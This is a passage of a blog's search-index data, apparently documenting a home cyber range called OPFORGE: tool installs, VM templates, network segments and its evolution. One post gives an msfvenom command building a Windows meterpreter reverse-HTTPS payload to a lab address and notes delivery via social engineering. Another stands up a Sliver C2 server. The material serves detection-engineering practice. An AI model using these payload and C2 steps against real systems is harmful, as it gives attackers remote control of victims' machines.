not be reliable due to segmented DNS or network control. Here\u0026rsquo;s how to install the full Sysinternals Suite offline to a standard lab path.\nüóÇÔ∏è Installation Directory All tools are installed to:\nC:\\OPFORGE\\Tools\\Sysinternals This ensures consistent, reproducible builds and clean environment variables.\nüõ†Ô∏è Installation Steps 1. Download From a system with internet access:\nInvoke-WebRequest -Uri \u0026#34;https://download.sysinternals.com/files/SysinternalsSuite.zip\u0026#34; -OutFile \u0026#34;SysinternalsSuite.zip\u0026#34; 2. Transfer and Install Copy the zip to C:\\OPFORGE\\SysinternalsSuite.zip, then run:\n$toolsPath = \u0026#34;C:\\OPFORGE\\Tools\\Sysinternals\u0026#34; New-Item -Path $toolsPath -ItemType Directory -Force Move-Item -Path \u0026#34;C:\\OPFORGE\\SysinternalsSuite.zip\u0026#34; -Destination \u0026#34;$toolsPath\\SysinternalsSuite.zip\u0026#34; Expand-Archive -Path \u0026#34;$toolsPath\\SysinternalsSuite.zip\u0026#34; -DestinationPath $toolsPath -Force 3. Update System Path [Environment]::SetEnvironmentVariable(\u0026#34;Path\u0026#34;, $env:Path + \u0026#34;;$toolsPath\u0026#34;, [EnvironmentVariableTarget]::Machine) ‚úÖ Result You can now run Sysinternals tools (like tcpview, autoruns, procmon) from any command line on the system. This method avoids Chocolatey errors and supports air-gapped deployment.\n","permalink":"https://opforge.dev/posts/2025-05-27-opf-sysinternals-offline-install/","summary":"\u003ch2 id=\"-purpose\"\u003eüéØ Purpose\u003c/h2\u003e\n\u003cp\u003eIn the OPFORGE lab, Chocolatey may not be reliable due to segmented DNS or network control. Here\u0026rsquo;s how to install the full \u003ca href=\"https://learn.microsoft.com/en-us/sysinternals/\"\u003eSysinternals Suite\u003c/a\u003e offline to a standard lab path.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-installation-directory\"\u003eüóÇÔ∏è Installation Directory\u003c/h2\u003e\n\u003cp\u003eAll tools are installed to:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eC:\\OPFORGE\\Tools\\Sysinternals\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThis ensures consistent, reproducible builds and clean environment variables.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-installation-steps\"\u003eüõ†Ô∏è Installation Steps\u003c/h2\u003e\n\u003ch3 id=\"1-download\"\u003e1. Download\u003c/h3\u003e\n\u003cp\u003eFrom a system with internet access:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInvoke-WebRequest -Uri \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://download.sysinternals.com/files/SysinternalsSuite.zip\u0026#34;\u003c/span\u003e -OutFile \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;SysinternalsSuite.zip\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"2-transfer-and-install\"\u003e2. Transfer and Install\u003c/h3\u003e\n\u003cp\u003eCopy the zip to \u003ccode\u003eC:\\OPFORGE\\SysinternalsSuite.zip\u003c/code\u003e, then run:\u003c/p\u003e","title":"Installing Sysinternals Suite Offline in OPFORGE"},{"content":"Metasploit Installed Metasploit was installed using the official msfinstall script:\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall chmod 755 msfinstall sudo ./msfinstall Confirmed with:\nmsfconsole --version Payload Generation The following payload was created for C2 operations within the DMZRED segment:\nsudo msfvenom -p windows/x64/meterpreter/reverse_https \\ LHOST=192.168.22.50 LPORT=8443 \\ -f exe -o shell.exe Payload was moved to:\n/opt/opforge/redteam/payloads/shell.exe File properties:\nfile shell.exe sha256sum shell.exe The payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.\nNext Steps Set up listener in msfconsole Deploy payload to opf-mbr01 Monitor detection in opf-blue01, opf-ai01, or via Winlogbeat pipeline ","permalink":"https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/","summary":"\u003ch2 id=\"metasploit-installed\"\u003eMetasploit Installed\u003c/h2\u003e\n\u003cp\u003eMetasploit was installed using the official \u003ccode\u003emsfinstall\u003c/code\u003e script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echmod \u003cspan style=\"color:#ae81ff\"\u003e755\u003c/span\u003e msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo ./msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eConfirmed with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emsfconsole --version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"payload-generation\"\u003ePayload Generation\u003c/h2\u003e\n\u003cp\u003eThe following payload was created for C2 operations within the DMZRED segment:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo msfvenom -p windows/x64/meterpreter/reverse_https \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  LHOST\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e192.168.22.50 LPORT\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e8443\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -f exe -o shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePayload was moved to:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/opt/opforge/redteam/payloads/shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFile properties:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efile shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esha256sum shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.\u003c/p\u003e","title":"OPF-RED01 Metasploit Setup \u0026 Payload Generation"},{"content":"Sliver Build \u0026amp; Launch After cloning the Sliver repository and resolving build prerequisites (notably zip), the server was compiled successfully using:\ncd /opt/opforge/tools/sliver make The Sliver server was then launched:\n./sliver-server Screenshot of Successful Launch This confirms the Sliver C2 is operational and ready to receive implants or generate payloads.\nNext Steps Launch sliver-client and test C2 communication Generate staged and unstaged payloads Begin Red Team activity with Sliver in DMZRED Monitor OPF-BLUE01/AI01 for correlated events ","permalink":"https://opforge.dev/posts/2025-05-26-opf-red01-sliver-setup/","summary":"\u003ch2 id=\"sliver-build--launch\"\u003eSliver Build \u0026amp; Launch\u003c/h2\u003e\n\u003cp\u003eAfter cloning the Sliver repository and resolving build prerequisites (notably \u003ccode\u003ezip\u003c/code\u003e), the server was compiled successfully using:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /opt/opforge/tools/sliver\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe Sliver server was then launched:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./sliver-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"screenshot-of-successful-launch\"\u003eScreenshot of Successful Launch\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Sliver Server Launch\" loading=\"lazy\" src=\"/images/posts/sliver-server-launch.png\"\u003e\u003c/p\u003e\n\u003cp\u003eThis confirms the Sliver C2 is operational and ready to receive implants or generate payloads.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"next-steps\"\u003eNext Steps\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLaunch \u003ccode\u003esliver-client\u003c/code\u003e and test C2 communication\u003c/li\u003e\n\u003cli\u003eGenerate staged and unstaged payloads\u003c/li\u003e\n\u003cli\u003eBegin Red Team activity with Sliver in DMZRED\u003c/li\u003e\n\u003cli\u003eMonitor OPF-BLUE01/AI01 for correlated events\u003c/li\u003e\n\u003c/ul\u003e","title":"OPF-RED01 Sliver Server Setup"},{"content":"base-ubuntu-2204-template OS: Ubuntu 22.04 LTS Minimal Uses: Cloning source for opf-red01, opf-log01, opf-ai01, opf-cloud01 Hardened baseline with: UFW firewall SSH key-based auth Git, Python, pip pre-installed Snapshot name: Clean Install ‚Äì Ready for Clone base-windows10-template OS: Windows 10 Pro 22H2 (fully patched) Uses: Cloning source for opf-mbr01, future victims Tools installed via Chocolatey: Sysmon, Winlogbeat, VSCode, Wireshark, Sysinternals Pre-Sysprep and snapshot-ready ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-template-builds/","summary":"\u003ch2 id=\"base-ubuntu-2204-template\"\u003ebase-ubuntu-2204-template\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOS: Ubuntu 22.04 LTS Minimal\u003c/li\u003e\n\u003cli\u003eUses: Cloning source for \u003ccode\u003eopf-red01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eHardened baseline with:\n\u003cul\u003e\n\u003cli\u003eUFW firewall\u003c/li\u003e\n\u003cli\u003eSSH key-based auth\u003c/li\u003e\n\u003cli\u003eGit, Python, pip pre-installed\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eSnapshot name: \u003ccode\u003eClean Install ‚Äì Ready for Clone\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"base-windows10-template\"\u003ebase-windows10-template\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOS: Windows 10 Pro 22H2 (fully patched)\u003c/li\u003e\n\u003cli\u003eUses: Cloning source for \u003ccode\u003eopf-mbr01\u003c/code\u003e, future victims\u003c/li\u003e\n\u003cli\u003eTools installed via Chocolatey:\n\u003cul\u003e\n\u003cli\u003eSysmon, Winlogbeat, VSCode, Wireshark, Sysinternals\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePre-Sysprep and snapshot-ready\u003c/li\u003e\n\u003c/ul\u003e","title":"Building Hardened Base Templates for Red, Blue, and AI VMs in OPFORGE"},{"content":"Segments CSOCINFRA (192.168.20.0/24): Houses opf-log01 (SIEM) and opf-ai01 (ML detection) LANWORKSTATIONS (192.168.30.0/24): Contains opf-mbr01 and future endpoints DMZRED (192.168.22.0/24): Hosts attacker targets like opf-cloud01 ADINFRA (192.168.40.0/24): Supports opf-dc01 and GPO testing Example Host Assignments Host IP Address Segment opf-fw01 192.168.1.24 (WAN) pfSense router opf-dc01 192.168.40.100 ADINFRA opf-mbr01 192.168.30.101 LANWORKSTATIONS opf-red01 192.168.22.50 DMZRED opf-log01 192.168.20.12 CSOCINFRA ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-network-design/","summary":"\u003ch2 id=\"segments\"\u003eSegments\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCSOCINFRA (192.168.20.0/24)\u003c/strong\u003e: Houses \u003ccode\u003eopf-log01\u003c/code\u003e (SIEM) and \u003ccode\u003eopf-ai01\u003c/code\u003e (ML detection)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLANWORKSTATIONS (192.168.30.0/24)\u003c/strong\u003e: Contains \u003ccode\u003eopf-mbr01\u003c/code\u003e and future endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDMZRED (192.168.22.0/24)\u003c/strong\u003e: Hosts attacker targets like \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eADINFRA (192.168.40.0/24)\u003c/strong\u003e: Supports \u003ccode\u003eopf-dc01\u003c/code\u003e and GPO testing\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"example-host-assignments\"\u003eExample Host Assignments\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eHost\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eSegment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-fw01\u003c/td\u003e\n          \u003ctd\u003e192.168.1.24 (WAN)\u003c/td\u003e\n          \u003ctd\u003epfSense router\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-dc01\u003c/td\u003e\n          \u003ctd\u003e192.168.40.100\u003c/td\u003e\n          \u003ctd\u003eADINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003e192.168.30.101\u003c/td\u003e\n          \u003ctd\u003eLANWORKSTATIONS\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003e192.168.22.50\u003c/td\u003e\n          \u003ctd\u003eDMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003e192.168.20.12\u003c/td\u003e\n          \u003ctd\u003eCSOCINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","title":"Designing a Segmented Cyber Lab: OPFORGE Network Architecture"},{"content":"OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\nEvolution Timeline Phase 1: Initial Sandbox Single VM (SOF-ELK) Flat network, no segmentation Manual log ingestion Phase 2: Tactical Expansion Added pfSense (opf-fw01) Introduced segmentation: CSOCINFRA, DMZRED, LANWORKSTATIONS, ADINFRA First red team emulation with opf-red01 Winlogbeat and Sysmon on endpoints Phase 3: Professionalization Cloned base templates (base-ubuntu-2204-template, base-windows10-template) VM-specific roles: opf-ai01, opf-log01, opf-mbr01, etc. AI and ML integration via Jupyter (opf-ai01) Multi-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch) Lessons Learned Legacy OS images break modern tools Cloning base templates improves consistency Network segmentation is essential for realistic detection engineering ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-infra-evolution/","summary":"\u003cp\u003eOPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\u003c/p\u003e\n\u003ch2 id=\"evolution-timeline\"\u003eEvolution Timeline\u003c/h2\u003e\n\u003ch3 id=\"phase-1-initial-sandbox\"\u003ePhase 1: Initial Sandbox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSingle VM (SOF-ELK)\u003c/li\u003e\n\u003cli\u003eFlat network, no segmentation\u003c/li\u003e\n\u003cli\u003eManual log ingestion\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-2-tactical-expansion\"\u003ePhase 2: Tactical Expansion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdded pfSense (\u003ccode\u003eopf-fw01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eIntroduced segmentation: \u003ccode\u003eCSOCINFRA\u003c/code\u003e, \u003ccode\u003eDMZRED\u003c/code\u003e, \u003ccode\u003eLANWORKSTATIONS\u003c/code\u003e, \u003ccode\u003eADINFRA\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFirst red team emulation with \u003ccode\u003eopf-red01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWinlogbeat and Sysmon on endpoints\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-3-professionalization\"\u003ePhase 3: Professionalization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCloned base templates (\u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e, \u003ccode\u003ebase-windows10-template\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eVM-specific roles: \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-mbr01\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eAI and ML integration via Jupyter (\u003ccode\u003eopf-ai01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eMulti-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLegacy OS images break modern tools\u003c/li\u003e\n\u003cli\u003eCloning base templates improves consistency\u003c/li\u003e\n\u003cli\u003eNetwork segmentation is essential for realistic detection engineering\u003c/li\u003e\n\u003c/ul\u003e","title":"From Sandbox to Cyber Range: How OPFORGE Evolved into a Professional Portfolio Lab"},{"content":"üß± Base Templates Used in OPFORGE This post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.\nüêß base-ubuntu-2204-template OS: Ubuntu 22.04 LTS (minimal ISO) Usage: Source image for all Linux-based OPFORGE components Configured With: SSH key-based authentication ufw firewall rules Preinstalled: Git, Python3, pip, htop, curl, net-tools Snapshot Label: ubuntu2204-clean-template ü™ü base-windows10-template OS: Windows 10 Pro 22H2 (fully patched) Usage: Source image for domain-joined endpoints Configured With: Tools installed via Install-OPFORGE-WindowsTools.ps1: Sysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark Bloatware removal and telemetry disabled Power settings and Start menu cleaned Snapshot Label: win10_22H2_tools_installed Both templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.\n","permalink":"https://opforge.dev/posts/opf-template-notes/","summary":"\u003ch2 id=\"-base-templates-used-in-opforge\"\u003eüß± Base Templates Used in OPFORGE\u003c/h2\u003e\n\u003cp\u003eThis post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"-base-ubuntu-2204-template\"\u003eüêß \u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Ubuntu 22.04 LTS (minimal ISO)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsage\u003c/strong\u003e: Source image for all Linux-based OPFORGE components\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfigured With\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eSSH key-based authentication\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eufw\u003c/code\u003e firewall rules\u003c/li\u003e\n\u003cli\u003ePreinstalled: Git, Python3, pip, htop, curl, net-tools\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSnapshot Label\u003c/strong\u003e: \u003ccode\u003eubuntu2204-clean-template\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"-base-windows10-template\"\u003eü™ü \u003ccode\u003ebase-windows10-template\u003c/code\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows 10 Pro 22H2 (fully patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsage\u003c/strong\u003e: Source image for domain-joined endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfigured With\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eTools installed via \u003ccode\u003eInstall-OPFORGE-WindowsTools.ps1\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003eSysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eBloatware removal and telemetry disabled\u003c/li\u003e\n\u003cli\u003ePower settings and Start menu cleaned\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSnapshot Label\u003c/strong\u003e: \u003ccode\u003ewin10_22H2_tools_installed\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003eBoth templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.\u003c/p\u003e","title":"OPFORGE Base Template Notes"},{"content":"OPFORGE Infrastructure Overview Overview OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\nEvolution Timeline Phase 1: Initial Sandbox Single VM (SOF-ELK) Flat network, no segmentation Manual log ingestion Phase 2: Tactical Expansion Added pfSense (opf-fw01) Introduced segmentation: CSOCINFRA, DMZRED, LANWORKSTATIONS, ADINFRA First red team emulation with opf-red01 Winlogbeat and Sysmon on endpoints Phase 3: Professionalization Cloned base templates (base-ubuntu-2204-template, base-windows10-template) VM-specific roles: opf-ai01, opf-log01, opf-mbr01, etc. AI and ML integration via Jupyter (opf-ai01) Multi-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch) Lessons Learned Legacy OS images break modern tools Cloning base templates improves consistency Network segmentation is essential for realistic detection engineering ","permalink":"https://opforge.dev/docs/opf-infra/","summary":"\u003ch1 id=\"opforge-infrastructure-overview\"\u003eOPFORGE Infrastructure Overview\u003c/h1\u003e\n\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\u003cp\u003eOPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\u003c/p\u003e\n\u003ch2 id=\"evolution-timeline\"\u003eEvolution Timeline\u003c/h2\u003e\n\u003ch3 id=\"phase-1-initial-sandbox\"\u003ePhase 1: Initial Sandbox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSingle VM (SOF-ELK)\u003c/li\u003e\n\u003cli\u003eFlat network, no segmentation\u003c/li\u003e\n\u003cli\u003eManual log ingestion\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-2-tactical-expansion\"\u003ePhase 2: Tactical Expansion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdded pfSense (\u003ccode\u003eopf-fw01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eIntroduced segmentation: \u003ccode\u003eCSOCINFRA\u003c/code\u003e, \u003ccode\u003eDMZRED\u003c/code\u003e, \u003ccode\u003eLANWORKSTATIONS\u003c/code\u003e, \u003ccode\u003eADINFRA\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFirst red team emulation with \u003ccode\u003eopf-red01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWinlogbeat and Sysmon on endpoints\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-3-professionalization\"\u003ePhase 3: Professionalization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCloned base templates (\u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e, \u003ccode\u003ebase-windows10-template\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eVM-specific roles: \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-mbr01\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eAI and ML integration via Jupyter (\u003ccode\u003eopf-ai01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eMulti-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLegacy OS images break modern tools\u003c/li\u003e\n\u003cli\u003eCloning base templates improves consistency\u003c/li\u003e\n\u003cli\u003eNetwork segmentation is essential for realistic detection engineering\u003c/li\u003e\n\u003c/ul\u003e","title":"OPFORGE Infrastructure Overview"},{"content":"OPFORGE Network Layout Segments CSOCINFRA (192.168.20.0/24): Houses opf-log01 (SIEM) and opf-ai01 (ML detection) LANWORKSTATIONS (192.168.30.0/24): Contains opf-mbr01 and future endpoints DMZRED (192.168.22.0/24): Hosts attacker targets like opf-cloud01 ADINFRA (192.168.40.0/24): Supports opf-dc01 and GPO testing Example Host Assignments Host IP Address Segment opf-fw01 192.168.1.24 (WAN) pfSense router opf-dc01 192.168.40.100 ADINFRA opf-mbr01 192.168.30.101 LANWORKSTATIONS opf-red01 192.168.22.50 DMZRED opf-log01 192.168.20.12 CSOCINFRA ","permalink":"https://opforge.dev/docs/opf-network-layout/","summary":"\u003ch1 id=\"opforge-network-layout\"\u003eOPFORGE Network Layout\u003c/h1\u003e\n\u003ch2 id=\"segments\"\u003eSegments\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCSOCINFRA (192.168.20.0/24)\u003c/strong\u003e: Houses \u003ccode\u003eopf-log01\u003c/code\u003e (SIEM) and \u003ccode\u003eopf-ai01\u003c/code\u003e (ML detection)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLANWORKSTATIONS (192.168.30.0/24)\u003c/strong\u003e: Contains \u003ccode\u003eopf-mbr01\u003c/code\u003e and future endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDMZRED (192.168.22.0/24)\u003c/strong\u003e: Hosts attacker targets like \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eADINFRA (192.168.40.0/24)\u003c/strong\u003e: Supports \u003ccode\u003eopf-dc01\u003c/code\u003e and GPO testing\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"example-host-assignments\"\u003eExample Host Assignments\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eHost\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eSegment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          